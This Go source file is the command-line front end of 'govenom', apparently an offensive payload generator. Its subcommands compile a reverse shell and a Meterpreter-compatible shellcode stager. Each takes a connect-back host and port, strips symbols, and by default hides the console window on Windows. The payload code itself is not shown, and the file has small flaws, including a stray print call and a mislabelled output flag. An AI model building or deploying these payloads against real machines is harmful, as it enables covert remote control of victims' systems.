package cmd

import (
	"fmt"
	"os"
	"runtime"

	"github.com/spf13/cobra"
)

type options struct {
	address      string
	arch         string
	os           string
	output       string
	debugCfg     string
	noWindowsGui bool
}

var opts options

var rootCmd = &cobra.Command{
	Use:           "govenom",
	Short:         "govenom is a cross-platform payload generator",
	SilenceErrors: true,
}

var reverseShellCmd = &cobra.Command{
	Use:   "reverse_shell",
	Short: "build a simple reverse shell",
	Run: func(cmd *cobra.Command, args []string) {
		regular := regularLDFlags{"w": "", "s": ""}
		if opts.os == "windows" && !opts.noWindowsGui {
			regular["H"] = "windowsgui"
		} else {
			fmt.Printf(opts.os)
		}
		externalVars := externalVarLDFlags{
			"address":  opts.address,
			"debugCfg": opts.debugCfg,
		}

		build([]string{
			"-ldflags", setupLDFlags(regular, externalVars),
			"-o", outputFileName("reverse_shell"),
			"./payloads/reverse_shell/main.go",
		})
	},
}

var stagerCmd = &cobra.Command{
	Use:   "stager",
	Short: "meterpreter/reverse_tcp compatible shellcode stager",
	Run: func(cmd *cobra.Command, args []string) {
		regular := regularLDFlags{"w": "", "s": ""}
		if opts.os == "windows" && !opts.noWindowsGui {
			regular["H"] = "windowsgui"
		} else {
			fmt.Printf(opts.os)
		}
		externalVars := externalVarLDFlags{
			"address":  opts.address,
			"debugCfg": opts.debugCfg,
		}

		build([]string{
			"-ldflags", setupLDFlags(regular, externalVars),
			"-o", outputFileName("stager"),
			"./payloads/stager/main.go",
		})
	},
}

func init() {
	rootCmd.PersistentFlags().StringVarP(&opts.address, "destination", "d", "", "connect-back destination, like LHOST (host:port)")
	rootCmd.MarkPersistentFlagRequired("destination")
	rootCmd.PersistentFlags().StringVar(&opts.arch, "arch", runtime.GOARCH, "target architecture")
	rootCmd.PersistentFlags().StringVar(&opts.os, "os", runtime.GOOS, "target operating system")
	rootCmd.PersistentFlags().StringVarP(&opts.output, "output", "o", "", "target operating system")
	rootCmd.PersistentFlags().StringVar(&opts.debugCfg, "debug", "", "debug configuration")
	rootCmd.PersistentFlags().BoolVar(&opts.noWindowsGui, "nowindowsgui", false, "don't use -H=windowsgui")

	rootCmd.AddCommand(reverseShellCmd)
	rootCmd.AddCommand(stagerCmd)
}

// Execute starts govemon
func Execute() {
	if err := rootCmd.Execute(); err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
}
